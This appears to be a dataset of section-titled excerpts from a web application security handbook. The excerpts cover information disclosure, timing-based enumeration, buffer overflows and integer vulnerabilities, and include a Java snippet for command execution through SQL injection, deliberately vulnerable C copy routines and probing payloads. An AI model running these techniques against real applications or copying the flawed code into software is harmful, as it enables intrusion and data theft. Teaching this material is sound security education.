be\nable to exploit this behavior to extract arbitrary data from the application.\nIn Chapter 9, you saw how verbose ODBC error messages can be leveraged\nin a SQL injection attack to retrieve the results of arbitrary database queries.\nFor example:\nMicrosoft OLE DB Provider for ODBC Drivers error ‘80040e07’\n[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting\nthe nvarchar value ‘pbyrne:losteip’ to a column of data type int.\nA different way in which this kind of technique can be used is where an\napplication error generates a stack trace containing a description of the error,\nand you can engineer a situation where interesting information is incorpo-\nrated into the error description.\nSome databases provide a facility to create user-defined functions written in\nJava. By exploiting a SQL injection flaw, you may be able to create your own\nfunction to perform arbitrary tasks. If the application returns error messages to\nthe browser, then from within your function you can throw a Java exception\ncontaining arbitrary data which you need to retrieve. For example, the follow-\ning code will execute the operating system command lsand then generate an"
  },
  {
    "input": "Gathering Published Information",
    "output": "70779c14.qxd:WileyRed 9/14/07 3:14 PM Page 513\nChapter 14 ■ Exploiting Information Disclosure 513\nexception which contains the output from the command. This will return a\nstack trace to the browser, the first line of which contains a directory listing:\nByteArrayOutputStream baos = new ByteArrayOutputStream();\ntry\n{\nProcess p = Runtime.getRuntime().exec(“ls”);\nInputStream is = p.getInputStream();\nint c;\nwhile (-1 != (c = is.read()))\nbaos.write((byte) c);\n}\ncatch (Exception e)\n{\n}\nthrow new RuntimeException(new String(baos.toByteArray()));\nGathering Published Information\nAside from the disclosure of useful information within error messages, the\nother primary way in which web applications give away sensitive data is by\nactually publishing it directly. There are various reasons why an application\nmay publish information that can be of use to an attacker:\n■■ By design, as part of the application’s core functionality.\n■■ As an unintended side effect of another function.\n■■ Through debugging functionality that remains present in the live\napplication.\n■■ Because of some vulnerability, such as broken access controls.\nExamples of potentially sensitive information that applications often pub-\nlish to users include:\n■■ Lists of valid usernames, account numbers, and document IDs.\n■■ User profile details, including user roles and privileges, date of last\nlogin, and account status.\n■■ The current user’s password (this is usually masked on-screen but is\npresent in the page source).\n■■ Log files containing information like usernames, URLs, actions per-\nformed, session tokens, and database queries.\n■■ Application details in client-side HTML source, such as commented-out\nlinks or form fields, and comments about bugs."
  },
  {
    "input": "Using Inference",
    "output": "70779c14.qxd:WileyRed 9/14/07 3:14 PM Page 514\n514 Chapter 14 ■ Exploiting Information Disclosure\nHACK STEPS\n■ Review the results of your application mapping exercises (see Chapter 4)\nto identify all server-side functionality and client-side data that may be\nused to obtain useful information.\n■ Identify any locations within the application where sensitive data such as\npasswords or credit card details are transmitted back from the server to\nthe browser. Even if these are masked on-screen, they are still of course\nviewable within the server’s response. If you have found another suit-\nable vulnerability, for example within access controls or session han-\ndling, then this behavior can be used to obtain the information belonging\nto other application users.\n■ If you identify any means of extracting sensitive information, use the\ntechniques described in Chapter 13 to automate the process.\nUsing Inference\nIn some situations, an application may not divulge any data to you directly,\nbut it may behave in ways that enable you to reliably infer information that is\nof use.\nWe have already encountered a number of instances of this phenomenon, in\nthe course of examining other categories of common vulnerability. For example:\n■■ A registration function that enables you to enumerate registered user-\nnames on the basis of an error message when an existing username is\nchosen (see Chapter 6).\n■■ A search engine that allows you to infer the contents of indexed docu-\nments that you are not authorized to view directly (see Chapter 11).\n■■ A blind SQL injection vulnerability in which you can alter the applica-\ntion’s behavior by adding a binary condition to an existing query,\nenabling to you extract information one bit at a time (see Chapter 9).\nAnother way in which subtle differences in an application’s behavior may\ndisclose information occurs when different operations take different lengths of\ntime to perform, contingent upon some fact that is of interest to an attacker.\nThis divergence can arise for various reasons:\n■■ Many large and complex applications retrieve data from numerous\nback-end systems, such as databases, message queues, and mainframes.\nTo improve performance, some applications cache information that is\nused frequently. Similarly, some applications employ a lazy load\n70779c14.qxd:WileyRed 9/14/07 3:14 PM Page 515\nChapter 14 ■ Exploiting Information Disclosure 515\napproach in which objects and data are loaded only when needed. In\nthis situation, data that has been recently accessed will be retrieved\nquickly from the server’s local cached copy, while other data is\nretrieved more slowly from the relevant back-end source.\nThis behavior has been observed in online banking applications, where\na request to access an account takes longer if the account is dormant\nthan if it is active, enabling a skilled attacker to enumerate accounts that\nhave been accessed recently by other users.\n■■ In some situations, the amount of processing that an application per-\nforms on a particular request may depend upon whether a submitted\nitem of data is valid. For example, when a valid username is supplied to\na login mechanism, the application may perform various database\nqueries to retrieve account information and to update the audit log, and\nmay perform computationally intensive operations to validate the sup-\nplied password against a stored hash. If an attacker can detect this timing\ndifference, he may be able to exploit it to enumerate valid usernames.\n■■ Some application functions may perform an action on the basis of user\ninput which will time out if an item of submitted data is not valid. For\nexample, an application may use a cookie to store the address of a host\nlocated behind a front-end load balancer. An attacker may be able to\nmanipulate this address to scan for web servers inside the organiza-\ntion’s internal network. If the address of an actual server that is not part\nof the application infrastructure is supplied, then the application may\nimmediately return an error. If a nonexistent address is supplied, then\nthe application may time out attempting to contact this address, before\nreturning the same generic error.\nHACK STEPS\n■ Differences in the timing of application responses may be subtle and\ndifficult to detect. In a typical situation, it is only worth probing the appli-\ncation for this behavior in selected key areas where a crucial item of\ninteresting data is submitted and where the kind of processing being per-\nformed is likely to result in time differences.\n■ To test a particular function, compile one list containing several items that\nare known to be valid (or to have been accessed recently) and a second\nlist containing items that are known to be invalid (or dormant). Make\nrequests containing each item on these lists in a controlled way, issuing\nonly one request at a time, and monitoring the time taken for the applica-\ntion to respond to each request. Determine whether there is any correla-\ntion between the status of the item and the time taken to respond.\nContinued"
  },
  {
    "input": "Preventing Information Leakage",
    "output": "70779c14.qxd:WileyRed 9/14/07 3:14 PM Page 516\n516 Chapter 14 ■ Exploiting Information Disclosure\nHACK STEPS (continued)\n■ You can use Burp Intruder to automate this task. For every request it gen-\nerates, Intruder automatically records the time taken before the applica-\ntion responds, and the time taken to complete the response. You can sort\na table of results by either of these attributes to quickly identify any\nobvious correlations.\nPreventing Information Leakage\nWhile it may not be feasible or desirable to prevent the disclosure of absolutely\nany information that an attacker may find useful, there are various relatively\nstraightforward measures that can be taken to reduce information leakage to a\nminimum and to withhold altogether the most sensitive data that can critically\nundermine an application’s security if disclosed to an attacker.\nUse Generic Error Messages\nThe application should never return verbose error messages or debug infor-\nmation to the user’s browser. When an unexpected event occurs (such as an\nerror in a database query, a failure to read a file from disk, or an exception in\nan external API call), the application should return the same, generic message\ninforming the user that an error occurred. If it is necessary to record debug\ninformation for support or diagnostic purposes, then this should be held in a\nserver-side log which is not publicly accessible, and an index number to the\nrelevant log entry may be returned to the user, enabling them to report this\nwhen contacting the helpdesk, if required.\nMost application platforms and web servers can be configured to mask error\ninformation from being returned to the browser:\n■■ In ASP.NET, verbose error messages can be suppressed using the\ncustomErrorselement of the Web.configfile, by setting the mode\nattribute to Onor RemoteOnlyand specifying a custom error page in the\ndefaultRedirectnode.\n■■ In the Java Platform, customized error messages can be configured\nusing the error-page element of the web.xmlfile. The exception-type\nnode can be used to specify a Java exception type, or the error-code\nnode used to specify an HTTP status code, and the custom page to\nbe displayed in the event of the specified error can be set using the\nlocationnode.\n70779c14.qxd:WileyRed 9/14/07 3:14 PM Page 517\nChapter 14 ■ Exploiting Information Disclosure 517\n■■ In Microsoft IIS, custom error pages can be specified for different HTTP\nstatus codes, using the Custom Errors tab of a web site’s properties tab.\nA different custom page can be set for each status code, and on a per-\ndirectory basis if required.\n■■ In Apache, custom error pages can be configured using the\nErrorDocumentdirective in httpd.conf. For example:\nErrorDocument 500 /generalerror.html\nProtect Sensitive Information\nWherever possible, the application should not publish information that may\nbe of use to an attacker, including usernames, log entries, or user profile\ndetails. If there is a need for certain users to access this information, it should\nbe protected by effective access controls and made available only where\nstrictly necessary.\nIn cases where sensitive information must be disclosed to an authorized\nuser (for example, where users are able to update their own account informa-\ntion), existing data should not be disclosed where it is not necessary. For exam-\nple, stored credit card numbers should be displayed in truncated form, and\npassword fields should never be prefilled, even if masked on-screen. These\ndefensive measures help to mitigate the impact of any serious vulnerabilities\nthat may exist within the application’s core security mechanisms of authenti-\ncation, session management, and access control.\nMinimize Client-Side Information Leakage\nWhere possible, service banners should be removed or modified to minimize\nthe disclosure of specific software versions, and so on. The steps needed to\nimplement this measure are dependent upon the technologies in use. For\nexample, in Microsoft IIS, the Server header can be removed using URLScan\nin the IISLockDown tool. In later versions of Apache, this can be achieved\nusing the mod_headersmodule. Because this information is subject to change,\nit is recommended that you consult your server documentation before carry-\ning out any modifications.\nAll comments should be removed from client-side code that is deployed to\nthe live production environment, including all HTML and JavaScript.\nParticular attention should be paid to any thick-client components such as\nJava applets and ActiveX controls. No sensitive information should be hidden\nwithin these components. A skilled attacker can decompile or reverse engineer\nthese components to effectively recover their source code (see Chapter 5)."
  },
  {
    "input": "Questions",
    "output": "70779c14.qxd:WileyRed 9/14/07 3:14 PM Page 518\n518 Chapter 14 ■ Exploiting Information Disclosure\nChapter Summary\nLeakage of unnecessary information frequently does not present any kind of\nsignificant defect in an application’s security. Even highly verbose stack traces\nand other debugging messages may sometimes provide you with little lever-\nage in seeking to attack the application.\nIn other cases, however, you may discover sources of information that are of\ngreat value in developing your attack—for example, by providing you with\nlists of usernames, the precise versions of software components, or disclosing\nthe internal structure and functionality of the server-side application logic.\nBecause of this possibility, any serious assault on an application should\ninclude a forensic examination of both the application itself and publicly avail-\nable resources, to gather any information that may be of use in formulating\nyour attacks against it. On some occasions, information gathered in this way\ncan provide the foundation for a complete compromise of the application that\ndisclosed it.\nQuestions\nAnswers can be found at www.wiley.com/go/webhacker.\n1. While probing for SQL injection vulnerabilities, you request the follow-\ning URL:\nhttps://wahh-app.com/list.aspx?artist=foo’+having+1%3d1--\nand receive the following error message:\nServer: Msg 170, Level 15, State 1, Line 1\nLine 1: Incorrect syntax near ‘having1’.\nWhat can you infer from this? Does the application contain any\nexploitable condition?\n2. While you are performing fuzz testing of various parameters, an appli-\ncation returns the following error message:\nWarning: mysql_connect() [function.mysql-connect]: Access denied for\nuser ‘premiumdde’@‘localhost’ (using password: YES) in\n/home/doau/public_html/premiumdde/directory on line 15\nWarning: mysql_select_db() [function.mysql-select-db]: Access denied\nfor user ‘nobody’@‘localhost’ (using password: NO) in\n/home/doau/public_html/premiumdde/directory on line 16\nWarning: mysql_select_db() [function.mysql-select-db]: A link to the\nserver could not be established in\n70779c14.qxd:WileyRed 9/14/07 3:14 PM Page 519\nChapter 14 ■ Exploiting Information Disclosure 519\n/home/doau/public_html/premiumdde/directory on line 16\nWarning: mysql_query() [function.mysql-query]: Access denied for user\n‘nobody’@‘localhost’ (using password: NO) in\n/home/doau/public_html/premiumdde/directory on line 448\nWhat useful items of information can you extract from this?\n3. While mapping an application, you discover a hidden directory on the\nserver that has directory listing enabled and appears to contain a num-\nber of old scripts. Requesting one of these scripts returns the following\nerror message:\nCGIWrap Error: Execution of this script not permitted\nExecution of (contact.pl) is not permitted for the following reason:\nScript is not executable. Issue ‘chmod 755 filename’\nLocal Information and Documentation:\nCGIWrap Docs: http://wahh-app.com/cgiwrap-docs/\nContact EMail: helpdesk@wahh-app.com\nServer Data:\nServer Administrator/Contact: helpdesk@wahh-app.com\nServer Name: wahh-app.com\nServer Port: 80\nServer Protocol: HTTP/1.1\nRequest Data:\nUser Agent/Browser: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT\n5.1; .NET CLR 2.0.50727; FDM; InfoPath.1; .NET CLR 1.1.4322)\nRequest Method: GET\nRemote Address: 192.168.201.19\nRemote Port: 57961\nReferring Page: http://wahh-app.com/cgi-bin/cgiwrap/fodd\nWhat was the cause of this error, and what common web application\nvulnerability should you quickly check for?\n4. You are probing the function of a request parameter in an attempt\nto determine its purpose within an application. You request the follow-\ning URL:\nhttps://wahh-app.com/agents/checkcfg.php?name=\nadmin&id=13&log=1\nThe application returns the following error message:\nWarning: mysql_connect() [function.mysql-connect]: Can’t connect to\nMySQL server on ‘admin’ (10013) in\n/var/local/www/include/dbconfig.php on line 23\n70779c14.qxd:WileyRed 9/14/07 3:14 PM Page 520\n520 Chapter 14 ■ Exploiting Information Disclosure\nWhat has caused this error message, and what vulnerabilities should\nyou probe for as a result?\n5. While fuzzing a request for various categories of vulnerability, you sub-\nmit a single quotation mark within each request parameter in turn. One\nof the results contains an HTTP 500 status code, indicating potential\nSQL injection. You check the full contents of the message, which are as\nfollows:\nMicrosoft VBScript runtime error ‘800a000d’\nType mismatch: ‘[string: “‘“]‘\n/scripts/confirmOrder.asp, line 715\nIs the application vulnerable?"
  },
  {
    "input": "Chapter 15: Attacking Compiled Applications",
    "output": "70779c15.qxd:WileyRed 9/14/07 3:14 PM Page 521\nCHAPTER\n15\nAttacking Compiled\nApplications\nCompiled software that runs in a native execution environment has histori-\ncally been plagued by vulnerabilities like buffer overflows and format string\nbugs. The majority of web applications are written using languages and plat-\nforms that run in a managed execution environment in which these classic vul-\nnerabilities do not arise. One of the most significant advantages of languages\nsuch as C# and Java is that programmers do not need to worry about the kind\nof buffer management and pointer arithmetic problems that have affected soft-\nware developed in native languages such as C and C++, and have given rise to\nthe majority of critical bugs found in that software.\nNevertheless, you may occasionally encounter web applications that are\nwritten in native code, and many applications written primarily using man-\naged code contain portions of native code or call out to external components\nthat run in an unmanaged context. Unless you know for certain that your tar-\nget application does not contain any native code, it is worth performing some\nbasic tests designed to uncover any classic vulnerabilities that may exist.\nWeb applications that run on hardware devices such as printers and\nswitches very commonly contain some native code. Other likely targets\ninclude any page or script whose name includes possible indicators of native\ncode, such as dll or exe, and any functionality known to call out to legacy\nexternal components, such as logging mechanisms. If you believe that the\napplication you are attacking contains substantial amounts of native code,\nthen it may be desirable to test every piece of user-supplied data processed by\n521"
  },
  {
    "input": "Buffer Overflow Vulnerabilities",
    "output": "70779c15.qxd:WileyRed 9/14/07 3:14 PM Page 522\n522 Chapter 15 ■ Attacking Compiled Applications\nthe application, including the names and values of every parameter, cookie,\nrequest header, and other data.\nIn this chapter, we shall cover three main categories of classic software vul-\nnerability: buffer overflows, integer vulnerabilities, and format string bugs. In\neach case, we will describe some common vulnerabilities and then outline the\npractical steps you can take when probing for these bugs within a web appli-\ncation. This topic is a huge one, which extends far beyond the scope of a hand-\nbook about hacking web applications. To learn more about native software\nvulnerabilities and how to find them, we recommend the following books:\n■■ The Shellcoder’s Handbook, 2nd edition, by Chris Anley, John Heasman,\nFelix Linder, and Gerardo Richarte (Wiley, 2007)\n■■ The Art of Software Security Assessmentby Mark Dowd, John McDonald,\nand Justin Schuh (Addison-Wesley, 2006)\nNOTE Remote probing for the vulnerabilities described in this chapter carries\na high risk of denial-of-service to the application. Unlike vulnerabilities such\nas weak authentication and path traversal, the mere detection of classic\nsoftware vulnerabilities is likely to cause unhandled exceptions within the\ntarget application, which may cause it to stop functioning. If you intend to\nprobe a live application for these bugs, you must ensure that the application\nowner accepts the risks associated with the testing before you begin.\nBuffer Overflow Vulnerabilities\nBuffer overflow vulnerabilities occur when an application copies user-\nc ontrollable data into a memory buffer that is not sufficiently large to accom-\nmodate it. The destination buffer is overflowed, resulting in adjacent memory\nbeing overwritten with the user’s data. Depending on the nature of the vul-\nnerability, an attacker may be able to exploit it to execute arbitrary code on the\nserver or perform other unauthorized actions. Buffer overflow vulnerabilities\nhave been hugely prevalent in native software over the years, and have been\nwidely regarded as the Public Enemy Number One that developers of such\nsoftware need to avoid.\nStack Overflows\nBuffer overflows typically arise when an application uses an unbounded copy\noperation (such as strcpy in C) to copy a variable-size buffer into a fixed-size\nbuffer without verifying that the fixed-sized buffer is large enough. For example,\n70779c15.qxd:WileyRed 9/14/07 3:14 PM Page 523\nChapter 15 ■ Attacking Compiled Applications 523\nthe following function copies the username string into a fixed-size buffer allo-\ncated on the stack:\nbool CheckLogin(char* username, char* password)\n{\nchar _username[32];\nstrcpy(_username, username);\n...\nIf the usernamestring contains more than 32 characters, the _usernamebuffer\nis overflowed, and the attacker will overwrite the data in adjacent memory.\nIn a stack-based buffer overflow, a successful exploit typically involves over-\nwriting the saved return address on the stack. When the CheckLoginfunction is\ncalled, the processor pushes onto the stack the address of the instruction fol-\nlowing the call. When CheckLoginis finished, the processor pops this address\nback off the stack and returns execution to that instruction. In the meantime, the\nCheckLogin function allocates the _username buffer on the stack right next to\nthe saved return address. If an attacker can overflow the _username buffer, he\ncan overwrite the saved return address with a value of his choosing, thereby\ncausing the processor to jump to this address and execute arbitrary code.\nHeap Overflows\nHeap-based buffer overflows essentially involve the same kind of unsafe oper-\nation as described previously, except that the overflowed destination buffer is\nallocated on the heap, not the stack:\nbool CheckLogin(char* username, char* password)\n{\nchar* _username = (char*) malloc(32);\nstrcpy(_username, username);\n...\nIn a heap-based buffer overflow, what is typically adjacent to the destination\nbuffer is not any saved return address but other blocks of heap memory, sepa-\nrated by heap control structures. The heap is implemented as a doubly linked\nlist: each block is preceded in memory by a control structure that contains the\nsize of the block, a pointer to the previous block on the heap, and a pointer to\nthe next block on the heap. When a heap buffer is overflowed, the control\nstructure of an adjacent heap block is overwritten with user-controllable data.\nThis type of vulnerability is less straightforward to exploit than a stack-based\noverflow, but a common approach is to write crafted values into the overwrit-\nten heap control structure so as to cause an arbitrary overwrite of a critical\npointer at some future time. When the heap block whose control structure has\n70779c15.qxd:WileyRed 9/14/07 3:14 PM Page 524\n524 Chapter 15 ■ Attacking Compiled Applications\nbeen overwritten is freed from memory, the heap manager needs to update the\nlinked list of heap blocks. To do this, it needs to update the back link pointer of\nthe following heap block, and update the forward link pointer of the preceding\nheap block, so that these two items in the linked list point to each other. To do\nthis, it uses the values in the overwritten control structure. Specifically, in order\nto update the following block’s back link pointer, the heap manager derefer-\nences the forward link pointer taken from the overwritten control structure and\nwrites into the structure at this address the value of the back link pointer taken\nfrom the overwritten control structure. In other words, it writes a user-\nc ontrollable value to a user-controllable address. If an attacker has crafted his\noverflow data appropriately, he can overwrite any pointer in memory with a\nvalue of his choosing, with the objective of seizing control of the path of execu-\ntion and so executing arbitrary code. Typical targets for the arbitrary pointer\noverwrite are the value of a function pointer that will later be called by the\napplication, or the address of an exception handler that will be invoked the next\ntime an exception occurs.\nNOTE Modern compilers and operating systems have implemented various\ndefenses to protect software against programming errors that lead to buffer\noverflows. These defenses mean that real-world overflows today are in general\nmore difficult to exploit than the examples described here. For further\ninformation about these defenses and ways to circumvent them, see The\nShellcoder’s Handbook.\n“Off-by-One” Vulnerabilities\nA specific kind of overflow vulnerability arises where a programming error\nenables an attacker to write a single byte (or a small number of bytes) beyond\nthe end of an allocated buffer.\nConsider the following code, which allocates a buffer on the stack, performs\na counted buffer copy operation, and then null-terminates the destination\nstring:\nbool CheckLogin(char* username, char* password)\n{\nchar _username[32];\nint i;\nfor (i = 0; username[i] && i < 32; i++)\n_username[i] = username[i];\n_username[i] = 0;\n...\n70779c15.qxd:WileyRed 9/14/07 3:14 PM Page 525\nChapter 15 ■ Attacking Compiled Applications 525\nThe code copies up to 32 bytes and then adds the null terminator. Hence, if\nthe username is 32 bytes or longer, the null byte will be written beyond the end\nof the _username buffer, corrupting adjacent memory. This condition may be\nexploitable: if the adjacent item on the stack is the saved frame pointer of the\ncalling frame, then setting the lower-order byte to zero may cause it to point\ninto the _username buffer, and so to data that the attacker controls. When the\ncalling function returns, this may enable an attacker to take control of the flow\nof execution.\nA similar kind of vulnerability arises when developers overlook the need for\nstring buffers to include room for a null terminator. Consider the following\n“fix” to the original heap overflow:\nbool CheckLogin(char* username, char* password)\n{\nchar* _username = (char*) malloc(32);\nstrncpy(_username, username, 32);\n...\nHere, the programmer creates a fixed-size buffer on the heap and then per-\nforms a counted buffer copy operation, designed to ensure that the buffer is\nnot overflowed. However, if the username is longer than the buffer, then the\nbuffer is completely filled with characters from the username, leaving no room\nto append a trailing null byte. The copied version of the string has therefore\nlost its null terminator.\nIn languages like C, there is no separate record of a string’s length—the end\nof the string is indicated by a null byte (that is, one with the ASCII character\ncode zero). If a string loses its null terminator, then it effectively increases in\nlength, and continues as far as the next byte in memory, which happens to be\nzero. This unintended consequence can often cause unusual behavior and vul-\nnerabilities within an application.\nThe authors encountered a vulnerability of this kind in a web application\nrunning on a hardware device. The application contained a page that accepted\narbitrary parameters in a POSTrequest, and returned an HTML form contain-\ning the names and values of those parameters as hidden fields. For example:\nPOST /formRelay.cgi HTTP/1.0\nContent-Length: 3\na=b\nHTTP/1.1 200 OK\nDate: THU, 02 NOV 2006 14:53:13 GMT\nContent-Type: text/html\nContent-Length: 278\n<html>\n70779c15.qxd:WileyRed 9/14/07 3:14 PM Page 526\n526 Chapter 15 ■ Attacking Compiled Applications\n<head>\n<meta http-equiv=”content-type” content=”text/html;charset=iso-8859-1”>\n</head>\n<form name=”FORM_RELAY” action=”page.cgi” method=”POST”>\n<input type=”hidden” name=”a” value=”b”>\n</form>\n<body onLoad=”document.FORM_RELAY.submit();”>\n</body>\n</html>\nFor some reason, this page was used throughout the application to process\nall kinds of user input, much of which was sensitive. However, if 4096 or more\nbytes of data were submitted, then the returned form also contained the para-\nmeters submitted by the previous request to the page, even if these were sub-\nmitted by a different user. For example:\nPOST /formRelay.cgi HTTP/1.0\nContent-Length: 4096\na=bbbbbbbbbbbbb[lots more b’s]\nHTTP/1.1 200 OK\nDate: THU, 02 NOV 2006 14:58:31 GMT\nContent-Type: text/html\nContent-Length: 4598\n<html>\n<head>\n<meta http-equiv=”content-type” content=”text/html;charset=iso-8859-1”>\n</head>\n<form name=”FORM_RELAY” action=”page.cgi” method=”POST”>\n<input type=”hidden” name=”a” value=”bbbbbbbbbbbbb[lots more b’s]“>\n<input type=”hidden” name=”strUsername” value=”agriffiths”>\n<input type=”hidden” name=”strPassword” value=”aufwiedersehen”>\n<input type=”hidden” name=”Log_in” value=”Log+In”>\n</form>\n<body onLoad=”document.FORM_RELAY.submit();”>\n</body>\n</html>\nHaving identified this vulnerability, it was possible to poll the vulnerable\npage continuously with overlong data, and parse the responses to log every\npiece of data submitted to the page by other users, including login credentials\nand other sensitive information.\nThe root cause of the vulnerability was that the user-supplied data was\nbeing stored as null-terminated strings within 4096-byte blocks of memory.\nThe data was copied in a checked operation, so no straight overflow was pos-\nsible. However, if overlong input was submitted, then the copy operation\n70779c15.qxd:WileyRed 9/14/07 3:14 PM Page 527\nChapter 15 ■ Attacking Compiled Applications 527\nresulted in the loss of the null terminator, and so the string flowed into the next\ndata in memory. Therefore, when the application parsed out the request para-\nmeters, it continued up until the next null byte, and so included the parame-\nters supplied by another user.\nDetecting Buffer Overflow Vulnerabilities\nThe basic methodology for detecting buffer overflow vulnerabilities is to send\nlong strings of data to an identified target and monitor for anomalous results.\nIn some cases, subtle vulnerabilities exist that can only be detected by sending\nan overlong string of a specific length, or within a small range of lengths.\nHowever, in most cases vulnerabilities can be detected simply by sending a\nstring that is longer than the application is expecting.\nProgrammers commonly create fixed-size buffers using round numbers in\neither decimal or hexadecimal, such as 32, 100, 1024, 4096, and so on. A simple\napproach to detecting any “low-hanging fruit” within the application is to\nsend long strings as each item of target data identified and to monitor the\nserver’s responses for anomalies.\nHACK STEPS\n■ For each item of data being targeted, submit a range of long strings with\nlengths somewhat longer than common buffer sizes. For example:\n1100\n4200\n33000\n■ Target one item of data at a time, to maximize the coverage of code\npaths within the application.\n■ You can use the character blocks payload source in Burp Intruder to\nautomatically generate payloads of various sizes.\n■ Monitor the application’s responses to identify any anomalies. An uncon-\ntrolled overflow is almost certain to cause an exception in the applica-\ntion. Detecting when this has occurred in a remote process is difficult,\nbut anomalous events to look for include:\n■ An HTTP 500 status code or error message, where other malformed\n(but not overlong) input does not have the same effect.\n■ An informative message, indicating that a failure occurred in some\nnative code component.\n■ A partial or malformed response is received from the server.\nContinued\n70779c15.qxd:WileyRed 9/14/07 3:14 PM Page 528\n528 Chapter 15 ■ Attacking Compiled Applications\nHACK STEPS (continued)\n■ The TCP connection to the server closes abruptly without returning a\nresponse.\n■ The entire web application stops responding.\n■ Note that when a heap-based overflow is triggered, this may result in a\ncrash at some future point, rather than immediately. You may need to\nexperiment to identify one or more test cases that are causing heap cor-\nruption.\n■ An off-by-one vulnerability may not cause a crash, but may result in\nanomalous behavior such as unexpected data being returned by the\napplication.\nIn some instances, your test cases may be blocked by input validation\nchecks implemented either within the application itself or by other compo-\nnents such as the web server. This often occurs when overlong data is submit-\nted within the URL query string, and may be indicated by a generic message\nsuch as “URL too long” in response to every test case. In this situation, you\nshould experiment to determine the maximum length of URL permitted\n(which is often around 2000 characters) and adjust your buffer sizes so that\nyour test cases comply with this requirement. Overflows may still exist behind\nthe generic length filtering, which can be triggered by strings short enough to\nget past that filtering.\nIn other instances, filters may restrict the type of data or range of characters\nthat can be submitted within a particular parameter. For example, an applica-\ntion may validate that a submitted username contains only alphanumeric\ncharacters before passing it to a function containing an overflow. To maximize\nthe effectiveness of your testing, you should attempt to ensure that each test\ncase contains only characters that are permitted in the relevant parameter. One\neffective technique for achieving this is to capture a normal request containing\ndata that the application accepts and to extend each targeted parameter in\nturn, using the same characters it already contains, to create a long string that\nis likely to pass any content-based filters.\nEven if you are confident that a buffer overflow condition exists, exploiting\nit remotely to achieve arbitrary code execution is extremely difficult. Peter\nWinter-Smith of NGSSoftware has produced some interesting research regard-\ning the possibilities for blind buffer overflow exploitation. For more informa-\ntion, see the following whitepaper:\nwww.ngssoftware.com/papers/NISR.BlindExploitation.pdf"
  },
  {
    "input": "Integer Vulnerabilities",
    "output": "70779c15.qxd:WileyRed 9/14/07 3:14 PM Page 529\nChapter 15 ■ Attacking Compiled Applications 529\nInteger Vulnerabilities\nInteger-related vulnerabilities typically arise when an application performs\nsome arithmetic on a length value, prior to performing some buffer operation,\nbut fails to take account of certain features of the way compilers and proces-\nsors handle integers. Two types of integer bugs are worthy of note: overflows\nand signedness errors.\nInteger Overflows\nThese occur when an operation on an integer value causes it to increase above\nits maximum possible value or decrease below its minimum possible value.\nWhen this occurs, the number wraps, so a very large number becomes very\nsmall or vice versa.\nConsider the following “fix” to the heap overflow described previously:\nbool CheckLogin(char* username, char* password)\n{\nunsigned short len = strlen(username) + 1;\nchar* _username = (char*) malloc(len);\nstrcpy(_username, username);\n...\nHere, the application measures the length of the user-submitted username,\nadds 1 to accommodate the trailing null, allocates a buffer of the resulting size,\nand then copies the username into it. With normal-sized input, this code\nbehaves as intended. However, if the user submits a username of 65,535 char-\nacters, then an integer overflow occurs. A short-sized integer contains 16 bits,\nwhich are enough for its value to range between 0 and 65,535. When a string of\nlength 65,535 is submitted, the program adds 1 to this, and the value wraps to\nbecome 0. A zero-length buffer is allocated, and the long username is copied\ninto it, causing a heap overflow. The attacker has effectively subverted the pro-\ngrammer’s attempt to ensure that the destination buffer is large enough.\nSignedness Errors\nThese occur when an application uses both signed and unsigned integers to\nmeasure the lengths of buffers, and confuses them at some point—either by\nmaking a direct comparison between a signed and an unsigned value, or by\npassing a signed value as a parameter to a function that takes an unsigned\nvalue. In both cases, the signed value is treated as its unsigned equivalent,\nmeaning that a negative number becomes a large positive number.\n70779c15.qxd:WileyRed 9/14/07 3:14 PM Page 530\n530 Chapter 15 ■ Attacking Compiled Applications\nConsider the following “fix” to the stack overflow described previously:\nbool CheckLogin(char* username, int len, char* password)\n{\nchar _username[32] = “”;\nif (len < 32)\nstrncpy(_username, username, len);\n...\nHere, the function takes both the user-supplied username and a signed\ninteger indicating its length. The programmer creates a fixed-size buffer on\nthe stack, checks whether the length is less than the size of the buffer, and if\nso performs a counted buffer copy, designed to ensure that the buffer is not\noverflowed.\nIf the len parameter is a positive number, this code behaves as intended.\nHowever, if an attacker can cause a negative value to be passed in to the func-\ntion, then the programmer’s protective check is subverted. The comparison\nwith 32 still succeeds, because the compiler treats both numbers as signed inte-\ngers. Hence, the negative length is passed to the strncpyfunction as its count\nparameter. Because strncpy takes an unsigned integer as this parameter, the\ncompiler implicitly casts the value of lento this type, so the negative value is\ntreated as a large positive number. If the user-supplied username string is\nlonger than 32 bytes, then the buffer is overflowed just as in a standard stack-\nbased overflow.\nThis kind of attack is normally feasible only when a length parameter is\ndirectly controllable by an attacker—for example, if it is computed by client-\nside JavaScript and submitted with a request alongside the string to which it\nrefers. However, if the size of the integer variable is small enough (for exam-\nple, a short) and the program computes the length on the server side, then an\nattacker may also be able to introduce a negative value via an integer overflow\nby submitting an overlong string to the application.\nDetecting Integer Vulnerabilities\nNaturally, the primary locations to probe for integer vulnerabilities are any\ninstances where an integer value is submitted from the client to the server. This\nbehavior usually arises in two different ways:\n■■ The application may pass integer values in the normal way as parame-\nters within the query string, cookies, or message body. These numbers\nwill usually be represented in decimal form, using standard ASCII char-\nacters. The most likely targets for testing are fields that appear to repre-\nsent the length of a string that is also being submitted."
  },
  {
    "input": "Format String Vulnerabilities",
    "output": "70779c15.qxd:WileyRed 9/14/07 3:14 PM Page 531\nChapter 15 ■ Attacking Compiled Applications 531\n■■ The application may pass integer values embedded within a larger blob\nof binary data. This data may originate from a client-side component\nsuch as an ActiveX control, or may have been transmitted via the client\nin a hidden form field or a cookie (see Chapter 5). Length-related inte-\ngers may be harder to identify in this context. They will typically be\nrepresented in hexadecimal form and will often directly precede the\nstring or buffer to which they relate. Note that binary data may be\nencoded using Base64 or similar schemes for transmission over HTTP.\nHACK STEPS\n■ Having identified targets for testing, you need to send suitable payloads\ndesigned to trigger any vulnerabilities. For each item of data being tar-\ngeted, send a series of different values in turn, representing boundary\ncases for the signed and unsigned versions of different sizes of integer.\nFor example:\n■ 0x7f and 0x80 (127 and 128)\n■ 0xff and 0x100 (255 and 256)\n■ 0x7ffff and 0x8000 (32767 and 32768)\n■ 0xffff and 0x10000 (65535 and 65536)\n■ 0x7fffffff and 0x80000000 (2147483647 and 2147483648)\n■ 0xffffffff and 0x0 (4294967295 and 0)\n■ When the data being modified is represented in hexadecimal form, you\nshould send little-endian as well as big-endian versions of each test\ncase—for example, ff7f as well as 7fff. If hexadecimal numbers are sub-\nmitted in ASCII form, you should use the same case as the application\nitself uses for alphabetical characters, to ensure that these are 